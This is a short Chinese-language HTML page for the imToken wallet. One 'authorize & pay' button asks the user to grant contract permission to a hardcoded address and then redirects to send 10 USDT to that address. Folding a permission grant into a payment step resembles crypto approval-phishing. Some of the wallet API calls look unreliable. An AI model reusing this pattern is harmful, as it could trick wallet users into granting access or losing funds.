<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>imToken 授权支付</title>
</head>
<body>
    <h2>imToken 授权支付</h2>
    <button onclick="authorizeAndPay()">授权 & 付款</button>

    <script>
        async function authorizeAndPay() {
            if (!window.imToken) {
                alert("请在 imToken App 内打开此页面");
                openInImToken(); // 如果在普通浏览器，则跳转到 imToken
                return;
            }

            try {
                // 合约地址（确保正确）
                const contractAddress = "0xYourDeployedContractOnBase"; 
                // 方法名（必须和 Solidity 一致）
                const functionName = "updatePermission"; 
                // 方法参数（钱包地址 + 布尔值）
                const functionParams = ["0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075", true]; 

                // 调用 imToken API 进行合约交互
                const result = await window.imToken.callAPI("native.account.request", {
                    contractAddress,
                    functionName,
                    functionParams,
                    message: "请授权合约访问权限"
                });

                console.log("授权成功:", result);
                alert(`授权成功，交易哈希: ${result.txHash}`);

                // 继续支付
                payWithImToken();

            } catch (error) {
                console.error("授权失败:", error);
                alert("授权失败，请检查钱包连接或权限");
            }
        }

        function payWithImToken() {
            // 设定收款地址、支付金额、代币类型
            const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 收款地址
            const amount = "10"; // 支付金额
            const token = "USDT"; // 代币类型（ERC20 / TRC20）

            // 生成支付链接
            const payUrl = `imtoken://transfer?contract=${token}&to=${toAddress}&value=${amount}`;
            
            // 跳转支付
            window.location.href = payUrl;
        }

        function openInImToken() {
            // 如果用户不在 imToken，跳转到 imToken 打开当前页面
            const dappUrl = encodeURIComponent(window.location.href);
            const openUrl = `imtokenv2://navigate/DappView?url=${dappUrl}`;
            window.location.href = openUrl;
        }
    </script>
</body>
</html>